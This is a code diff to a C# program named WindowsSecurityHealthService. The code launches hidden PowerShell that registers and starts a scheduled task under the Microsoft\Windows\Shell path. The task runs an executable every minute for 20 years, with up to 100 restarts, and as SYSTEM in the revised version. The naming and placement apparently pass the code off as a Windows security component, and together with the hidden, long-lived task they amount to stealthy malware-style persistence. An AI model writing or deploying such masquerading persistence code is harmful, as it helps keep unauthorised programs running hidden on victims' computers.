@@ -263,28 +263,34 @@ namespace WindowsSecurityHealthService
         {
             try
             {
-                string psCommand = $"$action = New-ScheduledTaskAction -Execute '{taskPath}'; " +
-                           "$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days (365 * 20)); " +
-                           "$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 100; " +
-                           "$settings.DisallowStartIfOnBatteries = $false; " +
-                           "$settings.StopIfGoingOnBatteries = $false; " +
-                           $"Register-ScheduledTask -Action $action -Trigger $trigger -TaskName '{taskName}' -TaskPath '\\Microsoft\\Windows\\Shell' -Settings $settings -Force; " +
-                           $"if (Get-ScheduledTask -TaskName '{taskName}' -ErrorAction SilentlyContinue) {{ Start-ScheduledTask -TaskPath '\\Microsoft\\Windows\\Shell' -TaskName '{taskName}' }} " +
-                           $"else {{ Write-Host 'Error: Scheduled task {taskName} was not created successfully.'; exit 1 }}";
-
+                string psCommand = @"
+$action = New-ScheduledTaskAction -Execute '" + taskPath + @"';
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days (365 * 20));
+$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 100;
+$settings.DisallowStartIfOnBatteries = $false;
+$settings.StopIfGoingOnBatteries = $false;
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName '" + taskName + @"' -TaskPath '\Microsoft\Windows\Shell' -Settings $settings -User 'SYSTEM' -Force;
+";
 
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
                     FileName = "powershell.exe",
                     Arguments = $"-Command \"{psCommand}\"",
-                    UseShellExecute = true,
+                    UseShellExecute = false,
                     CreateNoWindow = true,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
                     WindowStyle = ProcessWindowStyle.Hidden
                 };
 
                 using (Process process = Process.Start(psi))
                 {
-                    
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+                    process.WaitForExit();
+
+                    Trace.WriteLine("Output: " + output);
+                    Trace.WriteLine("Error: " + error);
                 }
 
             }
@@ -298,16 +304,26 @@ namespace WindowsSecurityHealthService
         {
             try
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo("powershell")
+                ProcessStartInfo psi = new ProcessStartInfo
                 {
+                    FileName = "powershell.exe",
                     Arguments = $"-Command \"if (Get-ScheduledTask -TaskName '{taskName}' -ErrorAction SilentlyContinue) {{ Start-ScheduledTask -TaskPath '\\Microsoft\\Windows\\Shell' -TaskName '{taskName}' }} else {{ Write-Host 'Error: Scheduled task {taskName} was not created successfully.'; exit 1 }}\"",
-                    Verb = "runas",
-                    UseShellExecute = true,
+                    UseShellExecute = false,
                     CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
                 };
 
-                Process.Start(startInfo);
+                using (Process process = Process.Start(psi))
+                {
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+                    process.WaitForExit();
+
+                    Trace.WriteLine("Output: " + output);
+                    Trace.WriteLine("Error: " + error);
+                }
 
             }
             catch (Exception ex)
